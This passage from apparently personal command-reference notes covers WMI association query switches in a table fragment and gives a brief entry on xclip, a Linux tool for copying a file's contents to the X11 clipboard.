|:--------------------------:| -------------------------------------------------------------------------------------------------------------------- |
| /RESULTCLASS:\<classname\> | The returned endpoints associated with the source object must belong to or be derived from the specified class.      |
|  /RESULTROLE:\<rolename\>  | The returned endpoints must play a particular role in their association with the source object.                      |
| /ASSOCCLASS:\<assocclass\> | The returned endpoints must be associated with the source through the specified class or one of its derived classes. |

# xclip
#linuxCmd #textProcessing 

Cmd line interface w/ the X11 clipboard.    
  
Useful for copying a file's contents to the clipboard:  
```bash
cat file | xclip -selection clipboard
```